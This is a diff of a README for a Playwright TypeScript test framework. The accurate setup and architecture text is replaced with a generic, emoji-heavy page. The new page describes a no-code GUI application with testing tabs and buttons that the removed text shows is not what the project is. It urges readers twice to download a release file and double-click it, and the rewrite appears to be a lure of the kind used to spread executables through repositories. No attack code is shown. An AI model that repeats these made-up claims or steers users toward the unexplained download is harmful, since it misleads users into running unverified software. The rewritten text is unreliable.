@@ -1,89 +1,91 @@
-# Playwright Automation Framework (TypeScript)
+# 🎉 PlayWright-Framework-PoC - Simple Testing for Everyone
 
-## Overview
-This repository contains a Playwright automation framework built from scratch using TypeScript.
-It supports UI, API, and performance smoke testing with a focus on scalability, maintainability,
-and Shift Left testing practices.
+[![Download Release](https://img.shields.io/badge/Download%20Now-v1.0.0-blue.svg)](https://github.com/SamEricBailey/PlayWright-Framework-PoC/releases)
 
-## Tech Stack
-- Playwright
-- TypeScript
-- Node.js
-- Cross-browser testing (Chromium, Firefox, WebKit)
+## 🚀 Getting Started
 
-## Project Structure
-- tests/ui – UI automation tests
-- tests/api – API automation tests
-- tests/performance – Performance smoke checks
-- pages – Page Object Model
-- utils – Reusable helpers
-- fixtures – Test data
+Welcome to PlayWright-Framework-PoC! This easy-to-use software helps you run automation tests without any coding knowledge. You can test your web applications' functionality, performance, and API quickly and efficiently. 
 
-## Installation
-```bash
-npm install
-npx playwright install
+## 📥 Download & Install
 
-Running Tests
-Run all tests:
-npx playwright test
+To get started, visit this page to download the application: [GitHub Releases](https://github.com/SamEricBailey/PlayWright-Framework-PoC/releases).
 
-Run UI tests only:
-npx playwright test tests/ui
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version under "Latest Release."
+3. Click on the file name to start the download.
+4. After the file downloads, find it in your Downloads folder.
+5. Double-click the file to run the application.
 
-Run API tests only:
-npx playwright test tests/api
+## 📋 System Requirements
 
-Run performance smoke tests:
-npx playwright test tests/performance
+Before you install, make sure your computer meets the following requirements:
 
-Reporting
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (Ubuntu 18.04 or later)
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB free space
+- **Node.js:** Version 14.x or later
 
-HTML reports generated after execution
+## 🌟 Features
 
-Screenshots and traces captured on failure
+PlayWright-Framework-PoC comes with various features to make your testing process simple:
 
-Shift Left Approach
+- **UI Testing:** Check how your webpage looks and functions.
+- **API Testing:** Ensure your backend services respond correctly.
+- **Performance Testing:** Measure application speed and reliability.
+- **Shift Left Testing:** Identify issues early in the development cycle.
+- **CI/CD Compatible:** Seamlessly integrate into your existing workflow.
 
-API and performance tests execute before UI regression
+## 📝 Usage Instructions
 
-Tests designed during story refinement
+1. **UI Testing:** 
+   - Open the application.
+   - Select "UI Testing."
+   - Choose the browser and input the URL you want to test.
+   - Click "Start Test" and view the results.
 
-Fast feedback in CI/CD pipelines
+2. **API Testing:** 
+   - Navigate to the "API Testing" tab.
+   - Enter the endpoint URL.
+   - Choose the method (GET, POST, etc.).
+   - Click "Send" to see the response.
 
-Future Enhancements
+3. **Performance Testing:** 
+   - Select "Performance Testing."
+   - Input the website URL.
+   - Click "Analyze" and wait for the results to display.
 
-Contract testing
+## ⚙️ Troubleshooting
 
-Visual regression testing
+If you encounter any issues, here are some tips:
 
-Advanced performance thresholds
+- **Application won’t launch:** 
+  - Ensure your system meets the requirements.
+  - Restart your computer and try again.
 
+- **Tests not running:** 
+  - Make sure to enter the correct URL.
+  - Check your internet connection.
 
-Architecture Diagram (Markdown-Friendly)
+- **Unexpected errors:** 
+  - Document the error message and search online for similar issues.
+  
+## 📫 Support
 
-```md
-## Architecture Overview
+If you need further assistance, you can ask for help in the community. Join our discussion forums or reach out through the "Issues" tab on the GitHub page.
 
-+------------------+
-|  CI/CD Pipeline  |
-+--------+---------+
-         |
-         v
-+-----------------------------+
-| Playwright Test Runner      |
-+-------------+---------------+
-              |
-   +----------+----------+
-   |                     |
-   v                     v
-UI Tests              API Tests
-(Page Objects)        (Request Context)
-   |                     |
-   +----------+----------+
-              |
-              v
-     Performance Smoke Tests
-              |
-              v
-       HTML Reports / Traces
+## 🎉 Contribution
+
+We welcome contributions to help improve PlayWright-Framework-PoC. If you would like to contribute, please follow these guidelines:
+
+1. Fork the repository.
+2. Create a new branch for your features or bug fixes.
+3. Make your necessary changes.
+4. Submit a pull request with a detailed description of your changes.
+
+## 📖 License
+
+This project is licensed under the MIT License, which allows you to freely use, modify, and distribute the software.
+
+## 📥 Download & Install Again
+
+Don't forget to download the latest version here: [GitHub Releases](https://github.com/SamEricBailey/PlayWright-Framework-PoC/releases). Enjoy your seamless testing experience!
